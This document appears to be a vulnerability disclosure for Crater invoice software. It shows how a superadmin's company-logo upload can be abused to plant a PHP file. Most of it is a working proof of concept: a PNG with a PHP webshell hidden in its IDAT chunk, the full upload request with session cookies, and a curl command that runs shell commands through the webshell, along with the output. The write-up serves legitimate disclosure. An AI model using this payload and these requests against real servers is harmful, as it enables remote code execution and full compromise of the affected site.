# Bypassing File Upload With IDAT on Crater Invoice

## Introduction

Crater is a open source invoice solution with over 7000+ stars on github.&#x20;

## Description

In latest or 6.0.6 version of crater, superadmin is able to upload PHP file instead of an image using the Company Logo upload feature. The Base64Mime.php checking function can be bypassed by embedding a valid PHP payload into an IDAT image chunk. I have used https://github.com/huntergregal/PNG-IDAT-Payload-Generator for the poc.

## Proof of Concept

To generate the IDAT PHP payload we use

```
python3 .\generate.py -m php -o test.png
```

Payload value:

```
‰PNG
→

IHDR ☻ü↑í£VIDATxœc\<?=$_GET[0]($_POST[1]);?>XÀs^7“ü‹Û~_Ó}ª'÷ñãÉ¿_ï♠|²0X—∟Ì0
FÁ(↑♣£`¶Œ‚Q0
FÁ(↑~#J↨☻º↔W´IEND®B`‚
```

Then use superadmin account to upload, change .png to .php

```
POST /api/v1/company/upload-logo HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Authorization: undefined
company: 1
X-XSRF-TOKEN: eyJpdiI6IjlmTDJpdzRNUUFCNVlObXUvbDN4c2c9PSIsInZhbHVlIjoidjJCdVlXemtlQ0NHbzFmTC93dzNxZzVhd0IrOFlYd1d6aUxCZWFJWElTd3pDTEdoTlNUT1o1S2NRMWp5cWRhckJVejhiZVArRThPbGxzSGRsVTg5QkJBY1RKdDhnOEt6MkxadHM0MGRPNkErZVRnRkJaenVXZXVrMHVlSkZMVzciLCJtYWMiOiJmMmE2ZWRkNjE4YzZmYTE5NjY1ODgxYWEzNDhkOGJlNzA1MmIxYWQyYmI3MjM2YmRiNjc2NzBmMDE2NDY3NTVhIiwidGFnIjoiIn0=
Content-Type: multipart/form-data; boundary=---------------------------5545470669814198892302696268
Content-Length: 552
Origin: http://localhost
Connection: close
Referer: http://localhost/admin/settings/company-info
Cookie: XSRF-TOKEN=eyJpdiI6IjlmTDJpdzRNUUFCNVlObXUvbDN4c2c9PSIsInZhbHVlIjoidjJCdVlXemtlQ0NHbzFmTC93dzNxZzVhd0IrOFlYd1d6aUxCZWFJWElTd3pDTEdoTlNUT1o1S2NRMWp5cWRhckJVejhiZVArRThPbGxzSGRsVTg5QkJBY1RKdDhnOEt6MkxadHM0MGRPNkErZVRnRkJaenVXZXVrMHVlSkZMVzciLCJtYWMiOiJmMmE2ZWRkNjE4YzZmYTE5NjY1ODgxYWEzNDhkOGJlNzA1MmIxYWQyYmI3MjM2YmRiNjc2NzBmMDE2NDY3NTVhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImhXdzFQMStlL0lTdHJTekQzTjdCcHc9PSIsInZhbHVlIjoiRnRjWFd5RERVNisrOVQ3Uk94S25DTWVkK1pjZTJUclQzYWV0ZXpQUG93OEhKd0RWV01XZmQ1ZmhlTGVqeDdaSGhPY3NUeDVvTm9xSXYzTVp6anFlbWxRb3JsZlR3YURscXo1UVh5My9nbCt6Y0F2T1Vsd3dESnhsQzZjSkQvR3oiLCJtYWMiOiI3M2ZjZjM0YmZhMTAzMGQwZmVlYTVmMjczNmEyYWUwZDY2MDNmZTcyNmQxMWFhMTk4YWRlMjJiOTNjNmQzZjIxIiwidGFnIjoiIn0%3D; dnXIFPcUKrLKVUG7aQgkhpLkCDcjlGIkv70LWxmf=eyJpdiI6Ilp4VGVCT3lheVViR1FFM0dsaTZkVHc9PSIsInZhbHVlIjoiTkpHTC9Cdzg0djRPWjFESitvdndYMVhRMFpCQ2pTUHRSQnVTOTVNMWh2T1l6SDR0QThIWDhZVDlTNmpsR085ZVJLSFFWRTR6dDdrVEhncTB6NlRQUzhLbHU1ZXJHdmV5WDBsU2U0R0lEeHNzM29abDBFczNDWTBVYUtoQyt0RlJlMmhvY0M2TVdaZFRqbkJvdWd1Zzk2QUxzUzZnb3BlbDZXOUhMeDQ1RkNTeUFwTit4QndOTnEzQzVCejFDbnNPUzBoc0N4dEh3UXBrVDBBSmdFa1dib0M0MHZZS05USWlMQnVFd2VJdmJIV2lhNXJRaGp0OTc2cUZQVXhTTEgzZE9JWWk3NjkrTGRNSnR2SWVwZ25YQjdVTWsySmdaYjQzc1c2KzBYc3lXYmUva3dZanR5Y3FsaGhzbUw5b2wvTExLR3huNHhsdDhKTG9rYjYwMUlrZlNRYzZ0aGVaQWpzSG0veStGYWorNWUyYzRZQ0lzN3NOMzRKV3BnZG1mZ1RsUG8ybk9SSlBhMEEzajZqdDU3OGIzV3RUd3hoQll1WisrbytpdUVMbzUvNm0zazNyWHVDYUZEbStzVFJXd2dDU3ZYY0xvZ0hrZTRNMG1vRzRURXdXanc9PSIsIm1hYyI6IjE5OGJhMTNjM2U5YTU2M2Q4Y2ZjOTRmYWNiOTU4YTMwZmVmMjY1YWJiZjNlYzc3YjI0YzAxODgzN2Q1N2RkZDciLCJ0YWciOiIifQ%3D%3D
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin


-----------------------------5545470669814198892302696268
Content-Disposition: form-data; name="company_logo"

{"name":"test.php","data":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs/PljAc143k/yPi9t+X9N9qif38ePJv1/vBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII="}
-----------------------------5545470669814198892302696268
Content-Disposition: form-data; name="is_company_logo_removed"

false
-----------------------------5545470669814198892302696268--

```

Attacker may then execute the PHP webshell by send request such as:

```
curl -XPOST -d '1=uname -a' 'http://localhost/storage/1/test.php?0=shell_exec' --output o && cat o
```

The output

```
�PNG
▒
IHDR �▒��VIDATx�c\Linux 11f1e6093117 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
X�s^7�����~_�}�'���ɿ_�|�0X��0
F�(▒�`��Q0
F�(▒~#J�W�IEND�B`�     
```

## Impact

Although it requires superadmin privilege, remote attacker that may be able to steal credential through social engineering or brute force will be able to execute arbitrary PHP code which is not intended as part of Crater's app.
